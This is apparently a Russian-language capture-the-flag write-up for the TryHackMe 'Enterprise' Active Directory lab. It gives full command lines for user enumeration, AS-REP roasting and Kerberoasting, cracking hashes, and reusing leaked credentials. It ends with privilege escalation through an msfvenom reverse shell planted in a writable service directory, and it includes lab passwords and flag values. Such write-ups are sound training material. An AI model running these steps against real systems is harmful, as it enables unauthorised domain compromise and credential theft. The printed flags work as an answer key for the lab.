https://tryhackme.com/room/enterprise

Enterprice writeup

Сканим 
```bash
rustscan -a $target -u 5000 -- -sCV -Pn -A -oA enterprice_scan
```

```bash
nxc smb $target -u '' -p ''
чекаем шары
smbclient -L //$target -U ""
smbclient -L //$target -N
```
получаем список пользаков
```bash
nxc smb $target -u 'guest' -p '' --rid-brute > rid_brute.txt
```


```bash
cat rid_brute.txt| awk {'print $6'} | cut -d '\' -f2 > users.txt
```
пробоем ас роастинг
```bash
impacket-GetNPUsers LAB.ENTERPRISE.THM/ -dc-ip $target -usersfile users.txt -request
```
ничего


Зайдя на гит к разрабу лабы можно обнаружить первые
```bash
https://github.com/Nik-enterprise-dev/mgmtScript.ps1/commit/bc40c9f237bfbe7be7181e82bebe7c0087eb7ed8
```
в коммитах можно обнаружить креды пользака 

сразу чекаем 

```bash
impacket-GetUserSPNs LAB.ENTERPRISE.THM/nik:ToastyBoi! -dc-ip $target -request -output hashes.txt
cat hashes.txt
john --wordlist=/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt hashes.txt
```

Получили нового пользака 
```bash
bitbucket:littleredbucket
nxc smb $target -u 'bitbucket' -p 'littleredbucket' --shares
```
ничего интересного, идем дальше..
```bash
nxc smb $target -u 'bitbucket' -p 'littleredbucket' --users
```
замечаем у пользака contractor-temp дискрипшин Change password from Password123!

меняем
```bash
impacket-changepasswd 'LAB.ENTERPRISE.THM/contractor-temp:Password123!'@$target -newpass 'Password123!!' -p rpc-samr
```
```bash
nxc smb $target -u 'contractor-temp' -p 'Password123!!' --shares
nxc winrm $target -u 'contractor-temp' -p 'Password123!!' 
```


```bash
xfreerdp3 /u:bitbucket /p:'littleredbucket' /d:LAB.ENTERPRISE.THM /v:$target
```
забираем инста флаг THM{ed882d02b34246536ef7da79062bef36}

теперь над повыситься
```bash
ip a
```
юзаем наш ип

здесь тестил блудхаунд для повышения, но увы у меня не получилось.. Возможно что лаба сломана и не дает заюзать его в полном объеме.
значит можем сделать через винпис..

ниже распишу варианты для передачи файлов между виндой и кали двустороннюю связь:
на кали
```bash
impacket-smbserver share . -smb2support -username user -password user
```
на винде
```bash
C:\Users\bitbucket>net use Z: \\ip_nash\share /user:user user
должно появиться это
The command completed successfully.
```
теперь есть двусторонняя связь между виндой и кали

способ 2:
можно юзать двухсторонний питон сервер на кали
```bash
pipx install uploadserver

#Запуск на порту 9876
uploadserver 9876
```
заходим и обмениваемся файлами   
---          
после изучения винпис, понимаем что есть права на запись и чтение в папке  C:\Program Files (x86)\Zero Tier
воспользуемся этим

генерим шелл

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.128.141 LPORT=3345 -f exe -o Zero.exe
```
перекидываем Zero.exe на целевой таргет в папку C:\Program Files (x86)\Zero Tier

получения шела через msf
```bash
msfconsole -q
msf > use multi/handler
msf exploit(multi/handler) > set lhost tun0
msf exploit(multi/handler) > set lport 3345
msf exploit(multi/handler) > set payload windows/shell_reverse_tcp 
msf exploit(multi/handler) > run
```

включаем в папке C:\Program Files (x86)\Zero Tier повершел и пишем 
```bash
Stop-Service -name zerotieroneservice
Start-Service -name zerotieroneservice
```

после получения шела бежим за флагом
THM{1a1fa94875421296331f145971ca4881}
